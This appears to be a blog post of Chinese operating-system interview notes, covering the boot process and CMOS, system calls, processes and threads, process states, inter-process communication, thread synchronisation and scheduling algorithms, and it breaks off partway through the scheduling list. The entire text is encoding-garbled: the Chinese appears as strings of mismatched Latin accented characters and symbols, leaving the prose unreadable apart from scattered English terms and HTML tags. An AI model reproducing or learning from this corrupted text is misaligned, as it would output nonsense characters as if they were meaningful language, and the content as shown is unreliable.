<p>é€šç”µ- biosï¼ˆbasic input output systemï¼‰ uefi å·¥ä½œ- è‡ªæ£€ - åˆ°ç¡¬ç›˜å›ºå®šä½ç½®åŠ è½½bootloader - è¯»å–å¯é…ç½®ä¿¡æ¯- CMOS</p>
<p>bootloaderçš„ä½ç½®æ˜¯å†™æ­»äº†,ä¸ç„¶biosæ‰¾ä¸åˆ°,biosæ˜¯å†™æ­»çš„,æ”¹ä¸äº†</p>
<p> CMOSæ˜¯ç”¨æ¥è®°å½•é…ç½®ä¿¡æ¯(å¼€æœºå¯†ç ),ä¸»åŠæœ‰å—ç”µæ± ç»™ä»–ä¾›ç”µ,å¿˜äº†å¯†ç å¯ä»¥æŠŠå®ƒçš„ç”µæ± æ‰£ä¸‹æ¥,å¯†ç å°±é‡ç½®äº†.</p>
<h2 id="æ“ä½œç³»ç»ŸåŸºç¡€"><a href="#æ“ä½œç³»ç»ŸåŸºç¡€" class="headerlink" title="æ“ä½œç³»ç»ŸåŸºç¡€"></a>æ“ä½œç³»ç»ŸåŸºç¡€</h2><h3 id="ä»€ä¹ˆæ˜¯æ“ä½œç³»ç»Ÿï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯æ“ä½œç³»ç»Ÿï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯æ“ä½œç³»ç»Ÿï¼Ÿ"></a>ä»€ä¹ˆæ˜¯æ“ä½œç³»ç»Ÿï¼Ÿ</h3><p>ğŸ‘¨â€ğŸ’»<strong>é¢è¯•å®˜</strong> ï¼š å…ˆæ¥ä¸ªç®€å•é—®é¢˜å§ï¼<strong>ä»€ä¹ˆæ˜¯æ“ä½œç³»ç»Ÿï¼Ÿ</strong></p>
<p>ğŸ™‹ <strong>æˆ‘</strong> ï¼šæˆ‘é€šè¿‡ä»¥ä¸‹å››ç‚¹å‘æ‚¨ä»‹ç»ä¸€ä¸‹ä»€ä¹ˆæ˜¯æ“ä½œç³»ç»Ÿå§ï¼</p>
<ol>
<li><strong>æ“ä½œç³»ç»Ÿï¼ˆOperating Systemï¼Œç®€ç§° OSï¼‰æ˜¯ç®¡ç†è®¡ç®—æœºç¡¬ä»¶ä¸è½¯ä»¶èµ„æºçš„ç¨‹åºï¼Œæ˜¯è®¡ç®—æœºçš„åŸºçŸ³ã€‚</strong></li>
<li><strong>æ“ä½œç³»ç»Ÿæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªè¿è¡Œåœ¨è®¡ç®—æœºä¸Šçš„è½¯ä»¶ç¨‹åº ï¼Œç”¨äºç®¡ç†è®¡ç®—æœºç¡¬ä»¶å’Œè½¯ä»¶èµ„æºã€‚</strong> ä¸¾ä¾‹ï¼šè¿è¡Œåœ¨ä½ ç”µè„‘ä¸Šçš„æ‰€æœ‰åº”ç”¨ç¨‹åºéƒ½é€šè¿‡æ“ä½œç³»ç»Ÿæ¥è°ƒç”¨ç³»ç»Ÿå†…å­˜ä»¥åŠç£ç›˜ç­‰ç­‰ç¡¬ä»¶ã€‚</li>
<li><strong>æ“ä½œç³»ç»Ÿå­˜åœ¨å±è”½äº†ç¡¬ä»¶å±‚çš„å¤æ‚æ€§ã€‚</strong> æ“ä½œç³»ç»Ÿå°±åƒæ˜¯ç¡¬ä»¶ä½¿ç”¨çš„è´Ÿè´£äººï¼Œç»Ÿç­¹ç€å„ç§ç›¸å…³äº‹é¡¹ã€‚</li>
<li><strong>æ“ä½œç³»ç»Ÿçš„å†…æ ¸ï¼ˆKernelï¼‰æ˜¯æ“ä½œç³»ç»Ÿçš„æ ¸å¿ƒéƒ¨åˆ†ï¼Œå®ƒè´Ÿè´£ç³»ç»Ÿçš„å†…å­˜ç®¡ç†ï¼Œç¡¬ä»¶è®¾å¤‡çš„ç®¡ç†ï¼Œæ–‡ä»¶ç³»ç»Ÿçš„ç®¡ç†ä»¥åŠåº”ç”¨ç¨‹åºçš„ç®¡ç†</strong>ã€‚ å†…æ ¸æ˜¯è¿æ¥åº”ç”¨ç¨‹åºå’Œç¡¬ä»¶çš„æ¡¥æ¢ï¼Œå†³å®šç€ç³»ç»Ÿçš„æ€§èƒ½å’Œç¨³å®šæ€§ã€‚</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848722.png" alt="Kernel_Layout"></p>
<h3 id="ç³»ç»Ÿè°ƒç”¨"><a href="#ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="ç³»ç»Ÿè°ƒç”¨"></a>ç³»ç»Ÿè°ƒç”¨</h3><p>æ ¹æ®è¿›ç¨‹è®¿é—®èµ„æºçš„ç‰¹ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠè¿›ç¨‹åœ¨ç³»ç»Ÿä¸Šçš„è¿è¡Œåˆ†ä¸ºä¸¤ä¸ªçº§åˆ«ï¼š</p>
<ol>
<li>ç”¨æˆ·æ€(user mode) : ç”¨æˆ·æ€è¿è¡Œçš„è¿›ç¨‹å¯ä»¥ç›´æ¥è¯»å–ç”¨æˆ·ç¨‹åºçš„æ•°æ®ã€‚</li>
<li>ç³»ç»Ÿæ€(kernel mode):å¯ä»¥ç®€å•çš„ç†è§£ç³»ç»Ÿæ€è¿è¡Œçš„è¿›ç¨‹æˆ–ç¨‹åºå‡ ä¹å¯ä»¥è®¿é—®è®¡ç®—æœºçš„ä»»ä½•èµ„æºï¼Œä¸å—é™åˆ¶ã€‚</li>
</ol>
<p>è¯´äº†ç”¨æˆ·æ€å’Œç³»ç»Ÿæ€ä¹‹åï¼Œé‚£ä¹ˆä»€ä¹ˆæ˜¯ç³»ç»Ÿè°ƒç”¨å‘¢ï¼Ÿ</p>
<p>æˆ‘ä»¬è¿è¡Œçš„ç¨‹åºåŸºæœ¬éƒ½æ˜¯è¿è¡Œåœ¨ç”¨æˆ·æ€ï¼Œå¦‚æœæˆ‘ä»¬è°ƒç”¨æ“ä½œç³»ç»Ÿæä¾›çš„ç³»ç»Ÿæ€çº§åˆ«çš„å­åŠŸèƒ½å’‹åŠå‘¢ï¼Ÿé‚£å°±éœ€è¦ç³»ç»Ÿè°ƒç”¨äº†ï¼</p>
<p>ä¹Ÿå°±æ˜¯è¯´åœ¨æˆ‘ä»¬è¿è¡Œçš„ç”¨æˆ·ç¨‹åºä¸­ï¼Œå‡¡æ˜¯ä¸ç³»ç»Ÿæ€çº§åˆ«çš„èµ„æºæœ‰å…³çš„æ“ä½œï¼ˆå¦‚æ–‡ä»¶ç®¡ç†ã€è¿›ç¨‹æ§åˆ¶ã€å†…å­˜ç®¡ç†ç­‰)ï¼Œéƒ½å¿…é¡»é€šè¿‡ç³»ç»Ÿè°ƒç”¨æ–¹å¼å‘æ“ä½œç³»ç»Ÿæå‡ºæœåŠ¡è¯·æ±‚ï¼Œå¹¶ç”±æ“ä½œç³»ç»Ÿä»£ä¸ºå®Œæˆã€‚</p>
<p>è¿™äº›ç³»ç»Ÿè°ƒç”¨æŒ‰åŠŸèƒ½å¤§è‡´å¯åˆ†ä¸ºå¦‚ä¸‹å‡ ç±»ï¼š</p>
<ul>
<li>è®¾å¤‡ç®¡ç†ã€‚å®Œæˆè®¾å¤‡çš„è¯·æ±‚æˆ–é‡Šæ”¾ï¼Œä»¥åŠè®¾å¤‡å¯åŠ¨ç­‰åŠŸèƒ½ã€‚</li>
<li>æ–‡ä»¶ç®¡ç†ã€‚å®Œæˆæ–‡ä»¶çš„è¯»ã€å†™ã€åˆ›å»ºåŠåˆ é™¤ç­‰åŠŸèƒ½ã€‚</li>
<li>è¿›ç¨‹æ§åˆ¶ã€‚å®Œæˆè¿›ç¨‹çš„åˆ›å»ºã€æ’¤é”€ã€é˜»å¡åŠå”¤é†’ç­‰åŠŸèƒ½ã€‚</li>
<li>è¿›ç¨‹é€šä¿¡ã€‚å®Œæˆè¿›ç¨‹ä¹‹é—´çš„æ¶ˆæ¯ä¼ é€’æˆ–ä¿¡å·ä¼ é€’ç­‰åŠŸèƒ½ã€‚</li>
<li>å†…å­˜ç®¡ç†ã€‚å®Œæˆå†…å­˜çš„åˆ†é…ã€å›æ”¶ä»¥åŠè·å–ä½œä¸šå ç”¨å†…å­˜åŒºå¤§å°åŠåœ°å€ç­‰åŠŸèƒ½ã€‚</li>
</ul>
<h2 id="è¿›ç¨‹å’Œçº¿ç¨‹-1"><a href="#è¿›ç¨‹å’Œçº¿ç¨‹-1" class="headerlink" title="è¿›ç¨‹å’Œçº¿ç¨‹"></a>è¿›ç¨‹å’Œçº¿ç¨‹</h2><h3 id="è¿›ç¨‹å’Œçº¿ç¨‹çš„åŒºåˆ«"><a href="#è¿›ç¨‹å’Œçº¿ç¨‹çš„åŒºåˆ«" class="headerlink" title="è¿›ç¨‹å’Œçº¿ç¨‹çš„åŒºåˆ«"></a>è¿›ç¨‹å’Œçº¿ç¨‹çš„åŒºåˆ«</h3><p>ğŸ‘¨â€ğŸ’»<strong>é¢è¯•å®˜</strong>: å¥½çš„ï¼æˆ‘æ˜ç™½äº†ï¼é‚£ä½ å†è¯´ä¸€ä¸‹ï¼š <strong>è¿›ç¨‹å’Œçº¿ç¨‹çš„åŒºåˆ«</strong>ã€‚</p>
<p>ğŸ™‹ <strong>æˆ‘ï¼š</strong> å¥½çš„ï¼ ä¸‹å›¾æ˜¯ Javaå†…å­˜åŒºåŸŸï¼Œæˆ‘ä»¬ä» JVM çš„è§’åº¦æ¥è¯´ä¸€ä¸‹çº¿ç¨‹å’Œè¿›ç¨‹ä¹‹é—´çš„å…³ç³»å§ï¼</p>
<blockquote>
<p>å¦‚æœä½ å¯¹Javaå†…å­˜åŒºåŸŸ (è¿è¡Œæ—¶æ•°æ®åŒº) è¿™éƒ¨åˆ†çŸ¥è¯†ä¸å¤ªäº†è§£çš„è¯å¯ä»¥é˜…è¯»ä¸€ä¸‹è¿™ç¯‡æ–‡ç« ï¼š<a href="https://snailclimb.gitee.io/javaguide/#/docs/java/jvm/Java%E5%86%85%E5%AD%98%E5%8C%BA%E5%9F%9F">ã€Šå¯èƒ½æ˜¯æŠŠ Java å†…å­˜åŒºåŸŸè®²çš„æœ€æ¸…æ¥šçš„ä¸€ç¯‡æ–‡ç« ã€‹</a></p>
</blockquote>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848734.png" alt="img"></p>
<p>ä»ä¸Šå›¾å¯ä»¥çœ‹å‡ºï¼šä¸€ä¸ªè¿›ç¨‹ä¸­å¯ä»¥æœ‰å¤šä¸ªçº¿ç¨‹ï¼Œå¤šä¸ªçº¿ç¨‹å…±äº«è¿›ç¨‹çš„å †å’Œæ–¹æ³•åŒº (JDK1.8 ä¹‹åçš„å…ƒç©ºé—´)<strong>èµ„æºï¼Œä½†æ˜¯æ¯ä¸ªçº¿ç¨‹æœ‰è‡ªå·±çš„ç¨‹åºè®¡æ•°å™¨ã€è™šæ‹Ÿæœºæ ˆ</strong>å’Œæœ¬åœ°æ–¹æ³•æ ˆã€‚</p>
<p><strong>æ€»ç»“ï¼š</strong> çº¿ç¨‹æ˜¯è¿›ç¨‹åˆ’åˆ†æˆçš„æ›´å°çš„è¿è¡Œå•ä½,ä¸€ä¸ªè¿›ç¨‹åœ¨å…¶æ‰§è¡Œçš„è¿‡ç¨‹ä¸­å¯ä»¥äº§ç”Ÿå¤šä¸ªçº¿ç¨‹ã€‚çº¿ç¨‹å’Œè¿›ç¨‹æœ€å¤§çš„ä¸åŒåœ¨äºåŸºæœ¬ä¸Šå„è¿›ç¨‹æ˜¯ç‹¬ç«‹çš„ï¼Œè€Œå„çº¿ç¨‹åˆ™ä¸ä¸€å®šï¼Œå› ä¸ºåŒä¸€è¿›ç¨‹ä¸­çš„çº¿ç¨‹ææœ‰å¯èƒ½ä¼šç›¸äº’å½±å“ã€‚çº¿ç¨‹æ‰§è¡Œå¼€é”€å°ï¼Œä½†ä¸åˆ©äºèµ„æºçš„ç®¡ç†å’Œä¿æŠ¤ï¼›è€Œè¿›ç¨‹æ­£ç›¸åã€‚</p>
<h3 id="è¿›ç¨‹æœ‰å“ªå‡ ç§çŠ¶æ€"><a href="#è¿›ç¨‹æœ‰å“ªå‡ ç§çŠ¶æ€" class="headerlink" title="è¿›ç¨‹æœ‰å“ªå‡ ç§çŠ¶æ€?"></a>è¿›ç¨‹æœ‰å“ªå‡ ç§çŠ¶æ€?</h3><p>ğŸ‘¨â€ğŸ’»<strong>é¢è¯•å®˜</strong> ï¼š é‚£ä½ å†è¯´è¯´<strong>è¿›ç¨‹æœ‰å“ªå‡ ç§çŠ¶æ€?</strong></p>
<p>ğŸ™‹ <strong>æˆ‘</strong> ï¼šæˆ‘ä»¬ä¸€èˆ¬æŠŠè¿›ç¨‹å¤§è‡´åˆ†ä¸º 5 ç§çŠ¶æ€ï¼Œè¿™ä¸€ç‚¹å’Œ<a href="https://github.com/Snailclimb/JavaGuide/blob/master/docs/java/Multithread/JavaConcurrencyBasicsCommonInterviewQuestionsSummary.md#6-%E8%AF%B4%E8%AF%B4%E7%BA%BF%E7%A8%8B%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%92%8C%E7%8A%B6%E6%80%81">çº¿ç¨‹</a>å¾ˆåƒï¼</p>
<ul>
<li><strong>åˆ›å»ºçŠ¶æ€(new)</strong> ï¼šè¿›ç¨‹æ­£åœ¨è¢«åˆ›å»ºï¼Œå°šæœªåˆ°å°±ç»ªçŠ¶æ€ã€‚</li>
<li><strong>å°±ç»ªçŠ¶æ€(ready)</strong> ï¼šè¿›ç¨‹å·²å¤„äºå‡†å¤‡è¿è¡ŒçŠ¶æ€ï¼Œå³è¿›ç¨‹è·å¾—äº†é™¤äº†å¤„ç†å™¨ä¹‹å¤–çš„ä¸€åˆ‡æ‰€éœ€èµ„æºï¼Œä¸€æ—¦å¾—åˆ°å¤„ç†å™¨èµ„æº(å¤„ç†å™¨åˆ†é…çš„æ—¶é—´ç‰‡)å³å¯è¿è¡Œã€‚</li>
<li><strong>è¿è¡ŒçŠ¶æ€(running)</strong> ï¼šè¿›ç¨‹æ­£åœ¨å¤„ç†å™¨ä¸Šä¸Šè¿è¡Œ(å•æ ¸ CPU ä¸‹ä»»æ„æ—¶åˆ»åªæœ‰ä¸€ä¸ªè¿›ç¨‹å¤„äºè¿è¡ŒçŠ¶æ€)ã€‚</li>
<li><strong>é˜»å¡çŠ¶æ€(waiting)</strong> ï¼šåˆç§°ä¸ºç­‰å¾…çŠ¶æ€ï¼Œè¿›ç¨‹æ­£åœ¨ç­‰å¾…æŸä¸€äº‹ä»¶è€Œæš‚åœè¿è¡Œå¦‚ç­‰å¾…æŸèµ„æºä¸ºå¯ç”¨æˆ–ç­‰å¾… IO æ“ä½œå®Œæˆã€‚å³ä½¿å¤„ç†å™¨ç©ºé—²ï¼Œè¯¥è¿›ç¨‹ä¹Ÿä¸èƒ½è¿è¡Œã€‚</li>
<li><strong>ç»“æŸçŠ¶æ€(terminated)</strong> ï¼šè¿›ç¨‹æ­£åœ¨ä»ç³»ç»Ÿä¸­æ¶ˆå¤±ã€‚å¯èƒ½æ˜¯è¿›ç¨‹æ­£å¸¸ç»“æŸæˆ–å…¶ä»–åŸå› ä¸­æ–­é€€å‡ºè¿è¡Œã€‚</li>
</ul>
<h3 id="è¿›ç¨‹é€šä¿¡æ–¹å¼"><a href="#è¿›ç¨‹é€šä¿¡æ–¹å¼" class="headerlink" title="è¿›ç¨‹é€šä¿¡æ–¹å¼"></a>è¿›ç¨‹é€šä¿¡æ–¹å¼</h3><p>ğŸ‘¨â€ğŸ’»<strong>é¢è¯•å®˜</strong> ï¼š<strong>è¿›ç¨‹é—´çš„é€šä¿¡å¸¸è§çš„çš„æœ‰å“ªå‡ ç§æ–¹å¼å‘¢?</strong></p>
<p>ğŸ™‹ <strong>æˆ‘</strong> ï¼šå¤§æ¦‚æœ‰ 7 ç§å¸¸è§çš„è¿›ç¨‹é—´çš„é€šä¿¡æ–¹å¼ã€‚</p>
<blockquote>
<p>ä¸‹é¢è¿™éƒ¨åˆ†æ€»ç»“å‚è€ƒäº†:<a href="https://www.jianshu.com/p/c1015f5ffa74">ã€Šè¿›ç¨‹é—´é€šä¿¡ IPC (InterProcess Communication)ã€‹</a> è¿™ç¯‡æ–‡ç« ï¼Œæ¨èé˜…è¯»ï¼Œæ€»ç»“çš„éå¸¸ä¸é”™ã€‚</p>
</blockquote>
<ol>
<li><strong>ç®¡é“&#x2F;åŒ¿åç®¡é“(Pipes)</strong> ï¼šç”¨äºå…·æœ‰äº²ç¼˜å…³ç³»çš„çˆ¶å­è¿›ç¨‹é—´æˆ–è€…å…„å¼Ÿè¿›ç¨‹ä¹‹é—´çš„é€šä¿¡ã€‚</li>
<li><strong>æœ‰åç®¡é“(Names Pipes)</strong> : åŒ¿åç®¡é“ç”±äºæ²¡æœ‰åå­—ï¼Œåªèƒ½ç”¨äºäº²ç¼˜å…³ç³»çš„è¿›ç¨‹é—´é€šä¿¡ã€‚ä¸ºäº†å…‹æœè¿™ä¸ªç¼ºç‚¹ï¼Œæå‡ºäº†æœ‰åç®¡é“ã€‚æœ‰åç®¡é“ä¸¥æ ¼éµå¾ª**å…ˆè¿›å…ˆå‡º(first in first out)**ã€‚æœ‰åç®¡é“ä»¥ç£ç›˜æ–‡ä»¶çš„æ–¹å¼å­˜åœ¨ï¼Œå¯ä»¥å®ç°æœ¬æœºä»»æ„ä¸¤ä¸ªè¿›ç¨‹é€šä¿¡ã€‚</li>
<li><strong>ä¿¡å·(Signal)</strong> ï¼šä¿¡å·æ˜¯ä¸€ç§æ¯”è¾ƒå¤æ‚çš„é€šä¿¡æ–¹å¼ï¼Œç”¨äºé€šçŸ¥æ¥æ”¶è¿›ç¨‹æŸä¸ªäº‹ä»¶å·²ç»å‘ç”Ÿï¼›</li>
<li><strong>æ¶ˆæ¯é˜Ÿåˆ—(Message Queuing)</strong> ï¼šæ¶ˆæ¯é˜Ÿåˆ—æ˜¯æ¶ˆæ¯çš„é“¾è¡¨,å…·æœ‰ç‰¹å®šçš„æ ¼å¼,å­˜æ”¾åœ¨å†…å­˜ä¸­å¹¶ç”±æ¶ˆæ¯é˜Ÿåˆ—æ ‡è¯†ç¬¦æ ‡è¯†ã€‚ç®¡é“å’Œæ¶ˆæ¯é˜Ÿåˆ—çš„é€šä¿¡æ•°æ®éƒ½æ˜¯å…ˆè¿›å…ˆå‡ºçš„åŸåˆ™ã€‚ä¸ç®¡é“ï¼ˆæ— åç®¡é“ï¼šåªå­˜åœ¨äºå†…å­˜ä¸­çš„æ–‡ä»¶ï¼›å‘½åç®¡é“ï¼šå­˜åœ¨äºå®é™…çš„ç£ç›˜ä»‹è´¨æˆ–è€…æ–‡ä»¶ç³»ç»Ÿï¼‰ä¸åŒçš„æ˜¯æ¶ˆæ¯é˜Ÿåˆ—å­˜æ”¾åœ¨å†…æ ¸ä¸­ï¼Œåªæœ‰åœ¨å†…æ ¸é‡å¯(å³ï¼Œæ“ä½œç³»ç»Ÿé‡å¯)æˆ–è€…æ˜¾ç¤ºåœ°åˆ é™¤ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—æ—¶ï¼Œè¯¥æ¶ˆæ¯é˜Ÿåˆ—æ‰ä¼šè¢«çœŸæ­£çš„åˆ é™¤ã€‚æ¶ˆæ¯é˜Ÿåˆ—å¯ä»¥å®ç°æ¶ˆæ¯çš„éšæœºæŸ¥è¯¢,æ¶ˆæ¯ä¸ä¸€å®šè¦ä»¥å…ˆè¿›å…ˆå‡ºçš„æ¬¡åºè¯»å–,ä¹Ÿå¯ä»¥æŒ‰æ¶ˆæ¯çš„ç±»å‹è¯»å–.æ¯” FIFO æ›´æœ‰ä¼˜åŠ¿ã€‚<strong>æ¶ˆæ¯é˜Ÿåˆ—å…‹æœäº†ä¿¡å·æ‰¿è½½ä¿¡æ¯é‡å°‘ï¼Œç®¡é“åªèƒ½æ‰¿è½½æ— æ ¼å¼å­— èŠ‚æµä»¥åŠç¼“å†²åŒºå¤§å°å—é™ç­‰ç¼ºã€‚</strong></li>
<li><strong>ä¿¡å·é‡(Semaphores)</strong> ï¼šä¿¡å·é‡æ˜¯ä¸€ä¸ªè®¡æ•°å™¨ï¼Œç”¨äºå¤šè¿›ç¨‹å¯¹å…±äº«æ•°æ®çš„è®¿é—®ï¼Œä¿¡å·é‡çš„æ„å›¾åœ¨äºè¿›ç¨‹é—´åŒæ­¥ã€‚è¿™ç§é€šä¿¡æ–¹å¼ä¸»è¦ç”¨äºè§£å†³ä¸åŒæ­¥ç›¸å…³çš„é—®é¢˜å¹¶é¿å…ç«äº‰æ¡ä»¶ã€‚</li>
<li><strong>å…±äº«å†…å­˜(Shared memory)</strong> ï¼šä½¿å¾—å¤šä¸ªè¿›ç¨‹å¯ä»¥è®¿é—®åŒä¸€å—å†…å­˜ç©ºé—´ï¼Œä¸åŒè¿›ç¨‹å¯ä»¥åŠæ—¶çœ‹åˆ°å¯¹æ–¹è¿›ç¨‹ä¸­å¯¹å…±äº«å†…å­˜ä¸­æ•°æ®çš„æ›´æ–°ã€‚è¿™ç§æ–¹å¼éœ€è¦ä¾é æŸç§åŒæ­¥æ“ä½œï¼Œå¦‚äº’æ–¥é”å’Œä¿¡å·é‡ç­‰ã€‚å¯ä»¥è¯´è¿™æ˜¯æœ€æœ‰ç”¨çš„è¿›ç¨‹é—´é€šä¿¡æ–¹å¼ã€‚</li>
<li><strong>å¥—æ¥å­—(Sockets)</strong> : æ­¤æ–¹æ³•ä¸»è¦ç”¨äºåœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´é€šè¿‡ç½‘ç»œè¿›è¡Œé€šä¿¡ã€‚å¥—æ¥å­—æ˜¯æ”¯æŒ TCP&#x2F;IP çš„ç½‘ç»œé€šä¿¡çš„åŸºæœ¬æ“ä½œå•å…ƒï¼Œå¯ä»¥çœ‹åšæ˜¯ä¸åŒä¸»æœºä¹‹é—´çš„è¿›ç¨‹è¿›è¡ŒåŒå‘é€šä¿¡çš„ç«¯ç‚¹ï¼Œç®€å•çš„è¯´å°±æ˜¯é€šä¿¡çš„ä¸¤æ–¹çš„ä¸€ç§çº¦å®šï¼Œç”¨å¥—æ¥å­—ä¸­çš„ç›¸å…³å‡½æ•°æ¥å®Œæˆé€šä¿¡è¿‡ç¨‹ã€‚</li>
</ol>
<h3 id="çº¿ç¨‹åŒæ­¥æ–¹å¼"><a href="#çº¿ç¨‹åŒæ­¥æ–¹å¼" class="headerlink" title="çº¿ç¨‹åŒæ­¥æ–¹å¼"></a>çº¿ç¨‹åŒæ­¥æ–¹å¼</h3><p>ğŸ‘¨â€ğŸ’»<strong>é¢è¯•å®˜</strong> ï¼š<strong>é‚£çº¿ç¨‹é—´çš„åŒæ­¥çš„æ–¹å¼æœ‰å“ªäº›å‘¢?</strong></p>
<p>ğŸ™‹ <strong>æˆ‘</strong> ï¼šçº¿ç¨‹åŒæ­¥æ˜¯ä¸¤ä¸ªæˆ–å¤šä¸ªå…±äº«å…³é”®èµ„æºçš„çº¿ç¨‹çš„å¹¶å‘æ‰§è¡Œã€‚åº”è¯¥åŒæ­¥çº¿ç¨‹ä»¥é¿å…å…³é”®çš„èµ„æºä½¿ç”¨å†²çªã€‚æ“ä½œç³»ç»Ÿä¸€èˆ¬æœ‰ä¸‹é¢ä¸‰ç§çº¿ç¨‹åŒæ­¥çš„æ–¹å¼ï¼š</p>
<ol>
<li>**äº’æ–¥é‡(Mutex)**ï¼šé‡‡ç”¨äº’æ–¥å¯¹è±¡æœºåˆ¶ï¼Œåªæœ‰æ‹¥æœ‰äº’æ–¥å¯¹è±¡çš„çº¿ç¨‹æ‰æœ‰è®¿é—®å…¬å…±èµ„æºçš„æƒé™ã€‚å› ä¸ºäº’æ–¥å¯¹è±¡åªæœ‰ä¸€ä¸ªï¼Œæ‰€ä»¥å¯ä»¥ä¿è¯å…¬å…±èµ„æºä¸ä¼šè¢«å¤šä¸ªçº¿ç¨‹åŒæ—¶è®¿é—®ã€‚æ¯”å¦‚ Java ä¸­çš„ synchronized å…³é”®è¯å’Œå„ç§ Lock éƒ½æ˜¯è¿™ç§æœºåˆ¶ã€‚</li>
<li><strong>ä¿¡å·é‡(Semphares)</strong> ï¼šå®ƒå…è®¸åŒä¸€æ—¶åˆ»å¤šä¸ªçº¿ç¨‹è®¿é—®åŒä¸€èµ„æºï¼Œä½†æ˜¯éœ€è¦æ§åˆ¶åŒä¸€æ—¶åˆ»è®¿é—®æ­¤èµ„æºçš„æœ€å¤§çº¿ç¨‹æ•°é‡</li>
<li><strong>äº‹ä»¶(Event)</strong> :Wait&#x2F;Notifyï¼šé€šè¿‡é€šçŸ¥æ“ä½œçš„æ–¹å¼æ¥ä¿æŒå¤šçº¿ç¨‹åŒæ­¥ï¼Œè¿˜å¯ä»¥æ–¹ä¾¿çš„å®ç°å¤šçº¿ç¨‹ä¼˜å…ˆçº§çš„æ¯”è¾ƒæ“</li>
</ol>
<h3 id="è¿›ç¨‹çš„è°ƒåº¦ç®—æ³•"><a href="#è¿›ç¨‹çš„è°ƒåº¦ç®—æ³•" class="headerlink" title="è¿›ç¨‹çš„è°ƒåº¦ç®—æ³•"></a>è¿›ç¨‹çš„è°ƒåº¦ç®—æ³•</h3><p>ğŸ‘¨â€ğŸ’»<strong>é¢è¯•å®˜</strong> ï¼š<strong>ä½ çŸ¥é“æ“ä½œç³»ç»Ÿä¸­è¿›ç¨‹çš„è°ƒåº¦ç®—æ³•æœ‰å“ªäº›å—?</strong></p>
<p>ğŸ™‹ <strong>æˆ‘</strong> ï¼šå—¯å—¯ï¼è¿™ä¸ªæˆ‘ä»¬å¤§å­¦çš„æ—¶å€™å­¦è¿‡ï¼Œæ˜¯ä¸€ä¸ªå¾ˆé‡è¦çš„çŸ¥è¯†ç‚¹ï¼</p>
<p>ä¸ºäº†ç¡®å®šé¦–å…ˆæ‰§è¡Œå“ªä¸ªè¿›ç¨‹ä»¥åŠæœ€åæ‰§è¡Œå“ªä¸ªè¿›ç¨‹ä»¥å®ç°æœ€å¤§ CPU åˆ©ç”¨ç‡ï¼Œè®¡ç®—æœºç§‘å­¦å®¶å·²ç»å®šä¹‰äº†ä¸€äº›ç®—æ³•ï¼Œå®ƒä»¬æ˜¯ï¼š</p>
<ul>
<li><strong>å…ˆåˆ°å…ˆæœåŠ¡(FCFS)è°ƒåº¦ç®—æ³•</strong> : ä»å°±ç»ªé˜Ÿåˆ—ä¸­é€‰æ‹©ä¸€ä¸ªæœ€å…ˆè¿›å…¥è¯¥é˜Ÿåˆ—çš„è¿›ç¨‹ä¸ºä¹‹åˆ†é…èµ„æºï¼Œä½¿å®ƒç«‹å³æ‰§è¡Œå¹¶ä¸€ç›´æ‰§è¡Œåˆ°å®Œæˆæˆ–å‘ç”ŸæŸäº‹ä»¶è€Œè¢«é˜»å¡æ”¾å¼ƒå ç”¨ CPU æ—¶å†é‡æ–°è°ƒåº¦ã€‚</li>
<li><strong>çŸ­ä½œä¸šä¼˜å…ˆ(SJF)çš„è°ƒåº¦ç®—æ³•</strong> : ä»å°±ç»ªé˜Ÿåˆ—ä¸­é€‰å‡ºä¸€ä¸ªä¼°è®¡è¿è¡Œæ—¶é—´æœ€çŸ­çš„è¿›ç¨‹ä¸ºä¹‹åˆ†é…èµ„æºï¼Œä½¿å®ƒç«‹å³æ‰§è¡Œå¹¶ä¸€ç›´æ‰§è¡Œåˆ°å®Œæˆæˆ–å‘ç”ŸæŸäº‹ä»¶è€Œè¢«é˜»å¡æ”¾å¼ƒå ç”¨ CPU æ—¶å†é‡æ–°è°ƒåº¦ã€‚</li>
<li><strong>æ—¶é—´ç‰‡è½®è½¬è°ƒåº¦ç®—æ³•</strong> : æ—¶é—´ç‰‡è½®è½¬è°ƒåº¦æ˜¯ä¸€ç§æœ€å¤è€ï¼Œæœ€ç®€å•ï¼Œæœ€å…¬å¹³ä¸”ä½¿ç”¨æœ€å¹¿çš„ç®—æ³•ï¼Œåˆç§° RR(Round robin)è°ƒåº¦ã€‚æ¯ä¸ªè¿›ç¨‹è¢«åˆ†é…ä¸€ä¸ªæ—¶é—´æ®µï¼Œç§°ä½œå®ƒçš„æ—¶é—´ç‰‡ï¼Œå³è¯¥è¿›ç¨‹å…è®¸è¿è¡Œçš„æ—¶é—´ã€‚</li>
<li><strong>å¤šçº§åé¦ˆé˜Ÿåˆ—è°ƒåº¦ç®—æ³•</strong> ï¼šå‰é¢ä»‹ç»çš„å‡ ç§è¿›ç¨‹è°ƒåº¦çš„ç®—æ³•éƒ½æœ‰ä¸€å®šçš„å±€é™æ€§ã€‚å¦‚<strong>çŸ­è¿›ç¨‹ä¼˜å…ˆçš„è°ƒåº¦ç®—æ³•ï¼Œä»…ç…§é¡¾äº†çŸ­è¿›ç¨‹è€Œå¿½ç•¥äº†é•¿è¿›ç¨‹</strong> ã€‚å¤šçº§åé¦ˆé˜Ÿåˆ—è°ƒåº¦ç®—æ³•æ—¢èƒ½ä½¿é«˜ä¼˜å…ˆçº§çš„ä½œä¸šå¾—åˆ°å“åº”åˆèƒ½ä½¿çŸ­ä½œä¸šï¼ˆè¿›ç¨‹ï¼‰è¿…é€Ÿå®Œæˆã€‚ï¼Œå› è€Œå®ƒæ˜¯ç›®å‰<strong>è¢«å…¬è®¤çš„ä¸€ç§è¾ƒå¥½çš„è¿›ç¨‹è°ƒåº¦ç®—æ³•</strong>ï¼ŒUNIX æ“ä½œç³»ç»Ÿé‡‡å–çš„ä¾¿æ˜¯è¿™ç§è°ƒåº¦ç®—æ³•ã€‚</li>
